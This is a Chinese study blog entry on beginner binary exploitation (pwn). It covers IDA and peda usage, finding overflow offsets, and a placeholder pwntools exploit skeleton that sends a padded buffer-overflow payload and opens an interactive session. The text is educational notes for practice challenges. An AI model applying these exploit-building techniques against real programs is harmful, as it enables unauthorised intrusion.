我也不清楚为啥 反正现在主题也选好了，起码可以开始正常写blog了。：）此外，对blog的config文件也更加熟悉。 用ida可以直接看到栈中缓冲区和变量的地址（F5大法），peda的功能更加熟悉(可以直接查看寄存器的值，栈的值，将要执行的指令等)，收货一个pattern.py脚本，可用来算溢出点，但自己看最好。 0xfffffff8(%ebp)=%ebp-0x8 exp基本框架以及pwntools基本用法： pwntools使用简介 pwntools开始使用 一步一步学pwntools 123456789101112131415161718192021from pwn import *//s=ssh(host='',user='',password='',port=)p=s.connect_remote('服务器名称',port)/p=s.process(argv=[],executable='./文件名')context(arch='amd64',os='linux',log_level='debug')//log_level='debug'的作用是将recv的内容全都显示在屏幕上。//定义变量p.recv(接收字节数)p.recvuntil('源代码中字符串')p.recvline()p.recvall()p.recvrepeat()p.send(发送字节数)p.senduntil('源代码中字符串')p.sendline()//shellcode生成：//payload生成:payload='n'*mpayload+=p32(整数)/p64(整数)p.sendline(payload)p.interactive() send()和sendline()的区别:(已解决。。因为源代码有一个gets()函数,末尾必须加一个换行符已以告知程序输入完毕，所以写exp时用sendline(payload),或者用send(payload + ‘\n’)).. （还没细看）关于一些保护措施(ASRL/PIE, NX/DEP, RELRO, Canary(栈保护))，参考链接 linux程序的常用保护机制 先看寻址方式，再看gdb中偏移量 当看到很多大写字母变量换成数字时，常为宏定义 scanf()函数限制了输入的形式，不能随意控制，其应该是整数溢出的漏洞题型。现阶段能掌握的只有gets()函数。。。。。。（p32打包好像只能用于字符串中的整数，scanf(%d)中的必须自己输入send(‘整数’)，不加’‘代表为字节数。。） recv()的接收数据为字符串，且一位为一个字符。 p.recv(&quot;)&quot;,drop=True) == p.recv(&quot;)&quot;).replace(&quot;)&quot;,&quot;&quot;) log为显示在屏幕上 有info warn 等几种标号 log]]></content>
      <categories>
        <category>PWN基础</category>
      </categories>
      <tags>
        <tag>summary</tag>
      </tags>
  </entry>
</search>
